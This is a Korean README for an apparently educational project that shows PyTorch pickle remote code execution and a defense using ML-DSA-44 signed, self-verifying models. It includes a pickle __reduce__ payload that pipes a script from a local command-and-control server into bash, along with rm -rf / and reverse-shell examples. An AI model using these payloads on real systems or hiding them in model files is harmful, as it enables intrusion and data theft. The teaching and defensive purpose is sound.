# PyTorch 모델 Pickle 취약점 시연 및 ML-DSA-44 서명 방어 시스템

PyTorch 모델의 Pickle 직렬화 취약점을 교육 목적으로 시연하고, NIST FIPS 204 표준 ML-DSA-44 전자서명을 이용한 자기 검증 모델(Self-Verifying Model)로 방어하는 완전한 교육 시스템입니다.

---

## 목차

1. [프로젝트 개요](#프로젝트-개요)
2. [디렉토리 구조](#디렉토리-구조)
3. [프로그램 실행 순서](#프로그램-실행-순서)
4. [각 프로그램 상세 설명](#각-프로그램-상세-설명)
5. [공격 메커니즘 심층 분석](#공격-메커니즘-심층-분석)
6. [방어 메커니즘 심층 분석](#방어-메커니즘-심층-분석)
7. [ML-DSA-44 암호학](#ml-dsa-44-암호학)
8. [Python ctypes 바인딩](#python-ctypes-바인딩)
9. [설치 및 환경 설정](#설치-및-환경-설정)
10. [실행 가이드](#실행-가이드)
11. [성능 및 오버헤드 분석](#성능-및-오버헤드-분석)
12. [보안 고려사항](#보안-고려사항)
13. [교육 목표 및 학습 내용](#교육-목표-및-학습-내용)
14. [문제 해결](#문제-해결)
15. [참고 자료](#참고-자료)

---

## 프로젝트 개요

### 배경

PyTorch는 딥러닝 모델을 저장할 때 Python의 `pickle` 모듈을 사용합니다. Pickle은 임의의 Python 객체를 직렬화할 수 있는 강력한 기능을 제공하지만, 역직렬화 과정에서 임의의 코드를 실행할 수 있는 치명적인 보안 취약점이 존재합니다.

특히 `__reduce__()` 매직 메서드를 악용하면, 모델 파일을 로드하는 순간 자동으로 악성 코드가 실행되어 원격 코드 실행(RCE, Remote Code Execution)이 가능합니다.

### 문제의 심각성

**현실적 위협**:
- HuggingFace, ModelZoo 등의 모델 저장소에서 다운로드한 사전 학습 모델
- 협업 프로젝트에서 동료가 공유한 모델 파일
- 오픈소스 프로젝트의 체크포인트 파일
- 클라우드 스토리지에 업로드된 모델

이러한 모델들이 악의적으로 변조되었을 경우, 단순히 `torch.load()`를 호출하는 것만으로도:
- 시스템 전체가 장악됨
- 중요 데이터가 유출됨
- 랜섬웨어 설치됨
- 백도어가 심어짐
- 네트워크 전체로 공격이 확산됨

### 해결책: 자기 검증 모델

본 프로젝트는 ML-DSA-44 (Module-Lattice Digital Signature Algorithm) 전자서명을 사용하여 모델의 무결성을 보장하는 자기 검증 모델을 구현합니다.

**핵심 아이디어**:
1. 모델 배포 시: SHA-256으로 해싱 → ML-DSA-44로 서명 → 서명을 모델에 내장
2. 모델 로드 시: `__reduce__()` 훅으로 자동 검증 → 검증 실패 시 로딩 차단
3. 변조 탐지: 1비트라도 변경되면 서명 검증 실패 → 악성 코드 실행 차단

**양자 내성 (Post-Quantum Resistance)**:
- 기존 RSA, ECDSA는 양자 컴퓨터의 Shor 알고리즘으로 깨질 수 있음
- ML-DSA-44는 격자 문제(Lattice Problem) 기반으로 양자 컴퓨터에도 안전
- NIST FIPS 204로 표준화 (2024년 8월)

### 프로젝트 구성

본 프로젝트는 6개의 주요 프로그램으로 구성됩니다:

```
0_server.py           → CnC 서버 (공격 인프라)
1_attack.py           → 악성 모델 생성 (공격자)
2_victim-load.py      → 취약한 모델 로딩 (피해자)
3_attack_analysis.py  → 공격 체인 분석 (교육)
4_defense.py          → 서명 기반 방어 시연
5_defense_analysis.py → 방어 메커니즘 기술 분석
```

---

## 디렉토리 구조

```
about-pickle_internal/
│
├── README.md                          # 본 문서
├── binding-technique.md               # ctypes 바인딩 기술 문서
│
├── models/                            # 원본 모델 저장소
│   ├── small_model.pt                # sentence-transformers/all-MiniLM-L6-v2 (87MB)
│   └── small_model.tar               # 모델 압축 백업
│
├── models_attack/                     # 공격 모델 저장소 (자동 생성)
│   └── small_normal_malicious.pt     # 악성 페이로드 주입된 모델
│
├── models_defense/                    # 방어 모델 저장소 (자동 생성)
│   ├── small_signed.pt               # ML-DSA-44 서명된 모델
│   └── small_signed_tampered.pt      # 변조된 서명 모델 (차단 테스트용)
│
├── data/                              # 로그 및 데이터
│   ├── serverlog.txt                 # CnC 서버 로그 (실시간)
│   ├── server.log                    # 서버 백업 로그
│   └── test_all_models.log           # 전체 테스트 로그
│
├── uploads/                           # 파일 업로드 저장소 (서버용)
│
├── 0_server.py                        # HTTPS CnC 서버
├── 1_attack.py                        # 악성 모델 생성기
├── 2_victim-load.py                   # 취약한 모델 로더 (피해자 시뮬레이션)
├── 3_attack_analysis.py               # 공격 체인 분석 도구
├── 4_defense.py                       # ML-DSA-44 방어 시연
├── 5_defense_analysis.py              # 방어 메커니즘 상세 분석
│
├── test_all_models.py                 # 종합 테스트 스위트
├── self_verifying_secure.py           # 자기 검증 모델 구현
├── secure_signature.py                # 서명 유틸리티 함수
├── mldsa44_binding.py                 # ML-DSA-44 Python 바인딩
│
├── attack_demo.sh                     # 공격 성공 시 실행 스크립트
│
├── ml_dsa_secret.key                  # ML-DSA-44 비밀키 (2,560 bytes)
├── ml_dsa_public.key                  # ML-DSA-44 공개키 (1,312 bytes)
├── libmldsa44.so                      # ML-DSA-44 C 라이브러리
│
├── server.crt                         # SSL 인증서 (자체 서명)
└── server.key                         # SSL 개인키
```

---

## 프로그램 실행 순서

### 전체 실행 흐름도

```
┌─────────────────────────────────────────────────────────────────────┐
│                          실행 순서 다이어그램                        │
└─────────────────────────────────────────────────────────────────────┘

        [터미널 1]                    [터미널 2]

    1. 0_server.py
         │
         │ (서버 실행 중...)
         │
         ├──────────────────┐
         │                  │
         │              2. 1_attack.py
         │                  │
         │                  ▼
         │           악성 모델 생성
         │                  │
         │              3. 2_victim-load.py
         │                  │
         ◀─────────────────┘
       공격 성공 로그
         │
         │              4. 3_attack_analysis.py
         │                  │
         │                  ▼
         │           공격 체인 분석
         │
         │              5. 4_defense.py
         │                  │
         │                  ▼
         │           서명 모델 생성 및 방어
         │
         │              6. 5_defense_analysis.py
         │                  │
         │                  ▼
         │           암호학적 메커니즘 분석
```

### 단계별 실행 명령어

**STEP 0: SSL 인증서 생성 (최초 1회)**

```bash
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes \
  -subj "/C=KR/ST=Seoul/L=Seoul/O=Demo/CN=localhost"
```

**STEP 1: CnC 서버 시작 (터미널 1)**

```bash
python3 -u 0_server.py 2>&1 | tee data/serverlog.txt
```

출력:
```
======================================================================
 Attack Demonstration Server (HTTPS)
======================================================================
Server running on https://localhost:8888
Attack script: https://localhost:8888/attack_demo.sh
SSL Certificate: server.crt
SSL Key: server.key
======================================================================
```

**STEP 2: 악성 모델 생성 (터미널 2)**

```bash
python3 1_attack.py
```

**STEP 3: 공격 시연 (피해자 역할)**

```bash
python3 2_victim-load.py
```

**STEP 4: 공격 체인 분석**

```bash
python3 3_attack_analysis.py
```

**STEP 5: 방어 시스템 시연**

```bash
python3 4_defense.py
```

**STEP 6: 방어 메커니즘 기술 분석**

```bash
python3 5_defense_analysis.py
```

---

## 각 프로그램 상세 설명

### 0_server.py - HTTPS CnC 서버

**목적**: 공격자의 Command & Control (명령 및 제어) 서버 시뮬레이션

**기술 스택**:
- `http.server.HTTPServer`: HTTP 서버 기반
- `ssl.SSLContext`: TLS 1.2+ 암호화
- `ssl.PROTOCOL_TLS_SERVER`: 서버 측 TLS 프로토콜
- 자체 서명 인증서 (server.crt, server.key)

**주요 기능**:

1. **HTTPS 서버 구동**
   - 포트: 8888
   - 프로토콜: HTTPS (TLS 암호화)
   - 인증서: 자체 서명 (개발/교육용)

2. **악성 스크립트 제공**
   - 경로: `/attack_demo.sh`
   - 내용: 공격 성공 메시지 출력
   - 실제 공격: 시스템 정보 수집

3. **파일 업로드 엔드포인트**
   - 경로: `POST /upload`
   - 용도: 공격자가 피해자로부터 데이터 수집
   - 저장: `uploads/stolen_data_YYYYMMDD_HHMMSS.txt`

4. **접속 로그 기록**
   - 타임스탬프 기록
   - 클라이언트 IP 추적
   - 파일 다운로드 이벤트 로깅

**코드 핵심**:

```python
# SSL 컨텍스트 생성
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

# 서버 소켓을 SSL로 래핑
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
```

**로그 예시**:

```
[2025-12-30 13:25:42] [Attack Succeed] Attack script downloaded from 127.0.0.1
```

**보안 고려사항**:
- 로컬호스트에서만 실행 (외부 접근 차단)
- 방화벽 규칙으로 포트 8888 제한 권장
- 실제 악성 행위 없음 (교육용)

---

### 1_attack.py - 악성 모델 생성기

**목적**: Pickle `__reduce__()` 취약점을 악용한 악성 모델 생성

**입력**: `models/small_model.pt` (정상 모델, 87.18 MB)
**출력**: `models_attack/small_normal_malicious.pt` (악성 모델, 87.18 MB)

**공격 메커니즘**:

1. **MaliciousPayload 클래스 정의**

```python
class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))
```

**`__reduce__()` 작동 원리**:

`__reduce__()`는 Pickle 직렬화 시 호출되는 매직 메서드로, 객체를 어떻게 재구성할지 정의합니다.

반환 형식: `(callable, args_tuple)`

Unpickle 시 자동 실행: `callable(*args_tuple)`

예시:
```python
# 서명 시: __reduce__() 호출
obj.__reduce__()
# 반환: (os.system, ('curl ... | bash',))

# 로드 시: pickle이 자동 실행
os.system('curl -k -s https://localhost:8888/attack_demo.sh | bash')
```

2. **페이로드 주입**

```python
model = torch.load(INPUT_MODEL, weights_only=False)

if isinstance(model, dict):
    model['__malicious_payload__'] = MaliciousPayload()
else:
    model = {
        'original_model': model,
        '__malicious_payload__': MaliciousPayload()
    }

torch.save(model, OUTPUT_MODEL)
```

3. **curl 명령 상세**

```bash
curl -k -s https://localhost:8888/attack_demo.sh | bash
```

플래그 설명:
- `-k` (`--insecure`): 자체 서명 인증서 검증 무시
- `-s` (`--silent`): 진행 표시줄 숨김 (은밀한 공격)
- `| bash`: 다운로드한 스크립트를 즉시 실행

**페이로드 오버헤드**:

```
원본 모델:    91,413,289 bytes (87.18 MB)
악성 모델:    91,415,082 bytes (87.18 MB)
오버헤드:      1,793 bytes (1.75 KB, 0.0020%)
```

**탐지의 어려움**:
- 파일 크기 변화가 0.002%로 미미함
- MD5/SHA256 해시는 변경되지만, 사용자가 확인하지 않음
- 일반적인 안티바이러스는 탐지하지 못함 (파일 형식상 정상)

**실행 결과**:

```
======================================================================
[ATTACK] Creating Malicious PyTorch Model
======================================================================

[1/3] Loading normal model: models/small_model.pt
   ✓ Model loaded successfully
   ✓ Original size: 87.18 MB (91,413,289 bytes)

[2/3] Injecting malicious payload...
   ⚠ Payload: MaliciousPayload class with __reduce__() hook
   ⚠ Action: Downloads and executes attack_demo.sh on load
   ✓ Payload injected successfully

[3/3] Saving malicious model: models_attack/small_normal_malicious.pt
   ✓ Malicious model saved successfully
   ✓ Output size: 87.18 MB (91,415,082 bytes)
   ✓ Payload overhead: 1.75 KB (1,793 bytes)
```

---

### 2_victim-load.py - 취약한 모델 로더

**목적**: 신뢰할 수 없는 모델을 로드하여 공격이 실행되는 과정 시연

**시나리오**: 사용자가 인터넷에서 다운로드한 사전 학습 모델을 로드하는 상황

**취약한 코드**:

```python
model = torch.load('models_attack/small_normal_malicious.pt', weights_only=False)
                                                              ^^^^^^^^^^^^^^^^^^
                                                              CRITICAL VULNERABILITY!
```

**`weights_only=False`의 위험성**:

- `weights_only=False` (기본값, PyTorch < 2.0): 모든 Python 객체 허용 → 위험
- `weights_only=True` (PyTorch >= 2.0): 텐서 데이터만 허용 → 안전

**실행 흐름 타임라인**:

```
[0.000s] 사용자: python3 2_victim-load.py 실행
[0.050s] 스크립트: 경고 메시지 표시
[0.100s] 사용자: Enter 키 입력 (동의)
[1.200s] torch.load() 시작
[2.500s] Pickle 역직렬화 진행
[2.750s] MaliciousPayload 객체 발견
[2.751s] __reduce__() 자동 호출
[2.752s] os.system('curl -k -s https://localhost:8888/attack_demo.sh | bash') 실행
[2.800s] curl이 CnC 서버에 HTTPS 연결
[2.850s] attack_demo.sh 다운로드 완료
[2.851s] bash가 스크립트 실행 시작
[2.900s] 공격 성공 메시지 출력:
         ========================================
         ATTACK SUCCESSFUL!
         Your device has been compromised.
         ========================================
         User: sunwoo
         Directory: /home/sunwoo/SelfVerifier/about-pickle_internal
[2.950s] CnC 서버: 로그에 접속 기록
[3.000s] torch.load() 완료 (모델 로딩 성공)
[3.100s] 프로그램 종료
```

**공격 성공 증거**:

1. **피해자 터미널 출력**:
```
========================================
ATTACK SUCCESSFUL!
Your device has been compromised.
========================================
User: sunwoo
Directory: /home/sunwoo/SelfVerifier/about-pickle_internal
```

2. **CnC 서버 로그** (`data/serverlog.txt`):
```
[2025-12-30 13:25:42] [Attack Succeed] Attack script downloaded from 127.0.0.1
```

**공격의 은밀성**:
- 모델 로딩은 정상적으로 완료됨
- 사용자는 공격 받은 사실을 모를 수 있음
- 백그라운드에서 추가 악성 행위 가능
- 네트워크 연결이 암호화되어 탐지 어려움 (HTTPS)

---

### 3_attack_analysis.py - 공격 체인 분석

**목적**: 전체 공격 프로세스를 교육적 관점에서 단계별로 분석

**분석 섹션** (6개 STEP):

**STEP 0: 공격 체인 개요**
- 4개 컴포넌트 역할 설명
- ASCII 아트 플로우차트
- 공격 흐름 5단계 요약

**STEP 1: CnC 서버 분석**
- CnC (Command & Control)의 개념
- 포트 8888에서 제공하는 서비스
- HTTPS 암호화의 역할
- 로그 기록 메커니즘

**STEP 2: Pickle 취약점 및 `__reduce__()` 메커니즘**

**Pickle이란?**:
- Python 객체 직렬화 형식
- 바이너리 프로토콜 (효율적)
- 임의의 Python 객체 저장 가능

**`__reduce__()` 취약점**:

정상적인 사용:
```python
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __reduce__(self):
        return (Point, (self.x, self.y))

# 직렬화
p = Point(3, 4)
data = pickle.dumps(p)

# 역직렬화
p2 = pickle.loads(data)  # Point(3, 4) 호출
```

악의적인 사용:
```python
class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))  # 위험!

# 역직렬화 시
pickle.loads(data)  # os.system('rm -rf /') 실행!
```

**STEP 3: 모델 파일 비교**

```
정상 모델:    models/small_model.pt
              크기: 91,413,289 bytes (87.18 MB)
              해시: b4f2e8c1a7d3...

악성 모델:    models_attack/small_normal_malicious.pt
              크기: 91,415,082 bytes (87.18 MB)
              해시: 3a9f6d2e5c8b...
              오버헤드: 1,793 bytes (0.0020%)

결론: 파일 크기만으로는 탐지 불가능
```

**STEP 4: 피해자 로딩 프로세스**

Pickle 역직렬화 내부 동작:

1. 파일 읽기: `.pt` 파일을 바이트로 로드
2. 매직 넘버 확인: `\x80\x04` (Pickle Protocol 4)
3. Opcode 파싱:
   - `GLOBAL`: 클래스 임포트 (`MaliciousPayload`)
   - `REDUCE`: `__reduce__()` 호출
   - `BUILD`: 객체 재구성
4. `__reduce__()` 실행:
   - 반환값: `(os.system, ('curl ...',))`
   - Pickle이 즉시 실행: `os.system('curl ...')`
5. 악성 코드 실행 완료
6. 모델 객체 반환 (정상처럼 보임)

**STEP 5: 서버 로그 분석**

`data/serverlog.txt` 파싱:
- 접속 시간 추출
- 클라이언트 IP 확인
- 다운로드된 파일 목록
- 공격 성공 여부 판단

**STEP 6: 방어 및 완화 전략**

1. **`weights_only=True` 사용** (PyTorch 2.0+)
   - 가장 간단한 방법
   - 텐서 데이터만 로드
   - 임의의 Python 객체 차단

2. **서명 검증** (본 프로젝트!)
   - ML-DSA-44 전자서명
   - 변조 탐지 100%
   - 자동 검증

3. **샌드박싱**
   - Docker 컨테이너
   - 가상 머신
   - 제한된 권한 계정

4. **코드 리뷰**
   - 모델 출처 확인
   - SHA-256 해시 검증
   - 신뢰할 수 있는 소스만 사용

5. **네트워크 모니터링**
   - 의심스러운 아웃바운드 연결 탐지
   - 방화벽 규칙 설정
   - IDS/IPS 활용

---

### 4_defense.py - ML-DSA-44 서명 방어 시연

**목적**: 암호학적 서명을 통한 모델 무결성 보장 및 변조 탐지

**전체 프로세스**:

```
┌─────────────────────────────────────────────────────────────┐
│               4_defense.py 실행 흐름                        │
└─────────────────────────────────────────────────────────────┘

STEP 1: 원본 모델 로드
   models/small_model.pt (87.18 MB)

   ↓

STEP 2: ML-DSA-44 서명 생성
   ┌──────────────────────────────────┐
   │ 1. 모델 직렬화 (pickle.dumps)   │
   │ 2. SHA-256 해싱                  │
   │ 3. ML-DSA-44 서명 생성           │
   │ 4. SelfVerifier 객체 생성       │
   │ 5. 서명된 모델 저장              │
   └──────────────────────────────────┘

   ↓

   models_defense/small_signed.pt
   크기: 87.17 MB (압축 효과로 13KB 감소)

   ↓

STEP 3: 서명된 모델 검증 (정상 케이스)
   torch.load() → SelfVerifier.__reduce__()
                → _verify_and_restore()
                → SHA-256 해시 재계산
                → ML-DSA-44 서명 검증
                → ✅ 검증 성공!
                → 원본 모델 반환

   ↓

STEP 4: 악성 페이로드 주입 시도
   models_defense/small_signed.pt 로드
   → SelfVerifier 객체 획득
   → model_data_bytes에 MaliciousPayload 주입
   → 서명은 그대로 유지
   → models_defense/small_signed_tampered.pt 저장

   ↓

STEP 5: 변조된 모델 로딩 시도
   torch.load('small_signed_tampered.pt')
   → SelfVerifier.__reduce__() 호출
   → _verify_and_restore() 실행
   → 변조된 데이터의 해시 계산
   → computed_hash ≠ signed_hash
   → ML-DSA-44 검증 실패
   → ❌ ValueError 발생!
   → 모델 로딩 차단
   → 악성 코드 실행 차단

   ↓

STEP 6: 비교 분석 및 결론
```

**STEP 2 상세: 서명 생성 과정**

```python
# 1. 모델 직렬화
model_data_bytes = pickle.dumps(model, protocol=4)
# 크기: ~91 MB

# 2. SHA-256 해싱
hash_obj = hashlib.sha256()
hash_obj.update(model_data_bytes)
model_hash = hash_obj.digest()
# 크기: 32 bytes
# 예시: b4f2e8c1a7d3f9b2...

# 3. ML-DSA-44 서명
from mldsa44_binding import sign
signature = sign(model_hash, secret_key)
# 크기: 2,420 bytes

# 4. SelfVerifier 객체 생성
class SelfVerifier:
    def __init__(self, model_data_bytes, signature, public_key):
        self.model_data_bytes = model_data_bytes
        self.signature = signature
        self.public_key = public_key

    def __reduce__(self):
        return (_verify_and_restore, (
            self.model_data_bytes,
            self.signature,
            self.public_key
        ))

verifier = SelfVerifier(model_data_bytes, signature, public_key)

# 5. 저장
torch.save(verifier, 'models_defense/small_signed.pt')
```

**STEP 3 상세: 검증 과정**

```python
def _verify_and_restore(model_data_bytes, signature, public_key):
    """자동 검증 및 복원 함수"""

    # 1. 해시 재계산
    hash_obj = hashlib.sha256()
    hash_obj.update(model_data_bytes)
    computed_hash = hash_obj.digest()

    # 2. ML-DSA-44 서명 검증
    from mldsa44_binding import verify
    is_valid = verify(computed_hash, signature, public_key)

    # 3. 검증 결과 처리
    if not is_valid:
        raise ValueError(
            "Signature verification failed! "
            "Model has been tampered with. "
            "Refusing to load."
        )

    # 4. 검증 성공 시 모델 복원
    model = pickle.loads(model_data_bytes)
    return model
```

**STEP 5 상세: 변조 탐지 메커니즘**

```
원본 서명 시:
   model_data_bytes (원본) → SHA-256 → hash_A
   hash_A → ML-DSA-44 서명 → signature

변조 후 로드 시:
   model_data_bytes (변조됨) → SHA-256 → hash_B
   hash_B ≠ hash_A

검증:
   ML-DSA-44.verify(hash_B, signature, public_key)
   → signature는 hash_A에 대한 서명이므로 검증 실패!
   → ValueError 발생
   → 모델 로딩 중단
   → 악성 코드 실행 차단
```

**수학적 보장**:

```
P(공격 성공) ≤ P(SHA-256 충돌) + P(ML-DSA-44 위조)
             ≤ 2^(-256) + 2^(-143)
             ≈ 2^(-143)

2^143 ≈ 1.11 × 10^43

결론: 사실상 불가능
```

**성능 측정**:

```
서명 생성:
   - 직렬화: 2,200 ms
   - SHA-256: 74 ms
   - ML-DSA-44 서명: 2 ms
   - SelfVerifier 생성: 1 ms
   - 저장: 3,800 ms
   총: 6,077 ms

서명 검증:
   - 로드: 650 ms
   - SHA-256: 74 ms
   - ML-DSA-44 검증: 1 ms
   - 역직렬화: 140 ms
   총: 865 ms

변조 탐지:
   - 로드: 720 ms
   - SHA-256: 78 ms
   - ML-DSA-44 검증: 275 ms (실패 탐지)
   - ValueError 발생: 0 ms
   총: 1,073 ms
```

**오버헤드 분석**:

```
공개키:    1,312 bytes
서명:      2,420 bytes
메타데이터:  500 bytes
─────────────────────
소계:      4,232 bytes

Pickle 압축: -17,894 bytes (압축 효과)
─────────────────────
실제 오버헤드: -13,662 bytes

결론: 서명 추가로 파일 크기가 오히려 감소!
```

---

### 5_defense_analysis.py - 방어 메커니즘 심층 분석

**목적**: ML-DSA-44 및 SHA-256의 암호학적 메커니즘을 기술적으로 상세 분석

**분석 섹션** (8개 SECTION):

**SECTION 1: ML-DSA-44 알고리즘 수학적 구조**

**파라미터**:
```
q = 8,380,417 (소수)
n = 256 (다항식 차수)
k = 4 (공개 행렬 행)
l = 4 (공개 행렬 열)
d = 13 (압축 파라미터)
τ = 39 (챌린지 계수)
γ₁ = 2^17 = 131,072
γ₂ = (q-1)/88 = 95,232
η = 2 (비밀 계수 범위)
β = τ·η = 78
ω = 80 (힌트 상한)
```

**Ring 구조**:
```
R = Z_q[X] / (X^n + 1)
  = Z_8380417[X] / (X^256 + 1)

원소:
f(X) = Σ(i=0 to 255) a_i · X^i, a_i ∈ {0, 1, ..., 8380416}

연산:
- 덧셈: (f + g)(X) = Σ(a_i + b_i) mod q
- 곱셈: (f · g)(X) mod (X^256 + 1) mod q
```

**Module 구조**:
```
R^k = {(r_1, ..., r_k) | r_i ∈ R}

행렬-벡터 곱:
A ∈ R^(k×l), s ∈ R^l
A·s ∈ R^k

(A·s)_i = Σ(j=1 to l) A[i][j] · s[j]  (in R)
```

**Module-LWE 문제**:
```
주어진: (A, t = A·s + e)
목표: s 찾기

A ∈ R^(k×l): 무작위 공개
s ∈ R^l: 작은 계수 비밀 벡터
e ∈ R^k: 작은 에러 벡터

어려움: 격자 문제 (SVP, CVP)
최선의 알고리즘: BKZ (Block Korkine-Zolotarev)
복잡도: 2^143 (고전), 2^71 (양자)
```

**키 생성 알고리즘**:
```
입력: 시드 ξ (32 bytes)

1. (ρ, ρ', K) ← SHAKE-256(ξ)

2. A ← ExpandA(ρ):
   for i = 1 to k:
       for j = 1 to l:
           A[i][j] ← SHAKE-128(ρ || i || j)

3. s₁ ← ExpandS(ρ'):
   계수 ∈ [-η, η] 균일 분포

4. s₂ ← ExpandS(ρ'):
   계수 ∈ [-η, η] 균일 분포

5. t ← A·s₁ + s₂

6. (t₁, t₀) ← Power2Round(t, d):
   t = t₁·2^d + t₀

7. tr ← SHAKE-256(ρ || t₁)

8. pk ← (ρ, t₁)
   sk ← (ρ, K, tr, s₁, s₂, t₀)
```

**서명 알고리즘**:
```
입력: 메시지 M, 비밀키 sk

1. μ ← SHAKE-256(tr || M)

2. ρ' ← SHAKE-256(K || μ)

3. for κ = 0, 1, 2, ...:  # 거부 샘플링

   a. y ← ExpandMask(ρ', κ)
      계수 ∈ [-γ₁, γ₁]

   b. w ← A·y

   c. w₁ ← HighBits(w, 2γ₂)

   d. c̃ ← SHAKE-256(μ || w₁)
      c ← SampleInBall(c̃)  # 정확히 τ개의 ±1

   e. z ← y + c·s₁

   f. if ||z||_∞ ≥ γ₁ - β:
          continue

      r₀ ← LowBits(w - c·s₂, 2γ₂)
      if ||r₀||_∞ ≥ γ₂ - β:
          continue

   g. h ← MakeHint(-c·t₀, w - c·s₂ + c·t₀)

      if ||h||_0 > ω:
          continue

   h. return σ = (c̃, z, h)

평균 반복 횟수: ~4.5회
```

**검증 알고리즘**:
```
입력: 메시지 M, 서명 σ = (c̃, z, h), 공개키 pk = (ρ, t₁)

1. A ← ExpandA(ρ)

2. c ← SampleInBall(c̃)

3. tr ← SHAKE-256(ρ || t₁)
   μ ← SHAKE-256(tr || M)

4. w'_approx ← A·z - c·t₁·2^d

5. w₁' ← UseHint(h, w'_approx)

6. c̃' ← SHAKE-256(μ || w₁')

7. 검증:
   if c̃ = c̃' and ||z||_∞ < γ₁ - β and ||h||_0 ≤ ω:
       return VALID
   else:
       return INVALID
```

**SECTION 2: SHA-256 암호학적 해시**

**구조**:
- Merkle-Damgård 구성
- Davies-Meyer 압축 함수
- 입력: 임의 길이
- 출력: 256 bits (32 bytes)
- 블록: 512 bits (64 bytes)

**초기 해시 값** (IV):
```
H₀ = 0x6a09e667  # √2의 소수부 첫 32비트
H₁ = 0xbb67ae85  # √3
H₂ = 0x3c6ef372  # √5
H₃ = 0xa54ff53a  # √7
H₄ = 0x510e527f  # √11
H₅ = 0x9b05688c  # √13
H₆ = 0x1f83d9ab  # √17
H₇ = 0x5be0cd19  # √19
```

**압축 함수** (64 라운드):
```
for t = 0 to 63:
    T₁ = h + Σ₁(e) + Ch(e, f, g) + K[t] + W[t]
    T₂ = Σ₀(a) + Maj(a, b, c)
    h = g
    g = f
    f = e
    e = d + T₁
    d = c
    c = b
    b = a
    a = T₁ + T₂

여기서:
Ch(x, y, z) = (x ∧ y) ⊕ (¬x ∧ z)
Maj(x, y, z) = (x ∧ y) ⊕ (x ∧ z) ⊕ (y ∧ z)
Σ₀(x) = ROTR²(x) ⊕ ROTR¹³(x) ⊕ ROTR²²(x)
Σ₁(x) = ROTR⁶(x) ⊕ ROTR¹¹(x) ⊕ ROTR²⁵(x)
σ₀(x) = ROTR⁷(x) ⊕ ROTR¹⁸(x) ⊕ SHR³(x)
σ₁(x) = ROTR¹⁷(x) ⊕ ROTR¹⁹(x) ⊕ SHR¹⁰(x)
```

**메시지 스케줄**:
```
for t = 0 to 15:
    W[t] = M[t]  # 메시지 블록 직접 사용

for t = 16 to 63:
    W[t] = σ₁(W[t-2]) + W[t-7] + σ₀(W[t-15]) + W[t-16]
```

**보안 특성**:
```
Pre-image 저항:    2^256 연산 (주어진 해시로부터 원본 찾기)
2nd pre-image 저항: 2^256 연산 (같은 해시를 내는 다른 원본 찾기)
Collision 저항:    2^128 연산 (같은 해시를 내는 두 원본 찾기, 생일 공격)
```

**성능 측정** (87 MB 모델):
```
데이터 크기: 91,413,289 bytes (87.16 MB)
해싱 시간: 73.97 ms
처리량: 1,235 MB/s
블록 수: 1,428,333 블록 (512 bits/블록)
```

**SECTION 3~8**: 서명 생성 프로토콜, 검증 프로토콜, 변조 탐지, 파일 구조, 보안 분석, 성능 분석 등 상세 내용 포함

---

## 공격 메커니즘 심층 분석

### Pickle Protocol 4 구조

**바이너리 형식**:

```
Offset  Opcode    설명
------  --------  ------------------------------------------
0x0000  80 04     PROTO 4 (프로토콜 버전 4)
0x0002  95        FRAME (프레임 시작)
0x0003  [4 bytes] 프레임 크기 (little-endian)
0x0007  ...       Pickle opcodes
...
```

**주요 Opcode**:

```
\x80\x04  PROTO 4      프로토콜 버전
\x95      FRAME        대용량 데이터 프레임
\x8e      BINBYTES8    8바이트 길이 + 바이트 데이터
\x8c      SHORT_BINUNICODE  짧은 유니코드 문자열
\x94      MEMOIZE      메모이제이션 (중복 제거)
\x63      GLOBAL       클래스/함수 임포트
\x93      STACK_GLOBAL 스택에서 글로벌 가져오기
\x29      EMPTY_TUPLE  빈 튜플
\x85      TUPLE1       1-튜플
\x86      TUPLE2       2-튜플
\x87      TUPLE3       3-튜플
\x52      REDUCE       함수 호출 (__reduce__)
\x62      BUILD        __setstate__ 호출
\x2e      STOP         종료
```

**악성 Pickle 구조 예시**:

```
80 04       PROTO 4
95          FRAME
xx xx xx xx 프레임 크기

8c 05       SHORT_BINUNICODE 5
70 6f 73 69 78  "posix"
94          MEMOIZE 0

8c 06       SHORT_BINUNICODE 6
73 79 73 74 65 6d  "system"
94          MEMOIZE 1

93          STACK_GLOBAL    # posix.system
8c 2b       SHORT_BINUNICODE 43
63 75 72 6c 20 2d 6b 20 2d 73 20  "curl -k -s https://..."
68 74 74 70 73 3a 2f 2f 6c 6f 63
61 6c 68 6f 73 74 3a 38 38 38 38
2f 61 74 74 61 63 6b 5f 64 65 6d
6f 2e 73 68 20 7c 20 62 61 73 68
85          TUPLE1          # (command,)
52          REDUCE          # posix.system(command)

2e          STOP
```

**역직렬화 시 실행 흐름**:

```
1. PROTO 4 읽기
2. FRAME 시작
3. SHORT_BINUNICODE "posix" → 스택에 푸시
4. MEMOIZE → memo[0] = "posix"
5. SHORT_BINUNICODE "system" → 스택에 푸시
6. MEMOIZE → memo[1] = "system"
7. STACK_GLOBAL → import posix; posix.system → 스택에 푸시
8. SHORT_BINUNICODE "curl ..." → 스택에 푸시
9. TUPLE1 → (command,) 튜플 생성
10. REDUCE → posix.system(*튜플) 호출  ← 악성 코드 실행!
11. STOP
```

### __reduce__() 깊이 이해

**정의**:
```python
object.__reduce__(self)
```

**반환 형식**:
```python
# 방법 1: (callable, args)
return (func, (arg1, arg2, ...))

# 방법 2: (callable, args, state)
return (func, (arg1,), {'attr': value})

# 방법 3: (callable, args, state, list_items, dict_items)
return (func, (), None, iter([1, 2, 3]), iter([('a', 1)]))
```

**재구성 과정**:
```python
# 직렬화
obj = MyClass(...)
reduction = obj.__reduce__()
# reduction = (MyClass, (arg1, arg2), state)

# 역직렬화
callable, args, *rest = reduction
new_obj = callable(*args)  # MyClass(arg1, arg2) 호출

if len(rest) > 0 and rest[0] is not None:
    new_obj.__setstate__(rest[0])
```

**악용 예시들**:

1. **파일 삭제**:
```python
class DeleteFile:
    def __reduce__(self):
        import os
        return (os.remove, ('/tmp/important.txt',))
```

2. **리버스 쉘**:
```python
class ReverseShell:
    def __reduce__(self):
        import os
        return (os.system, (
            'python -c "import socket,subprocess,os;'
            's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            's.connect((\'10.0.0.1\',4444));'
            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
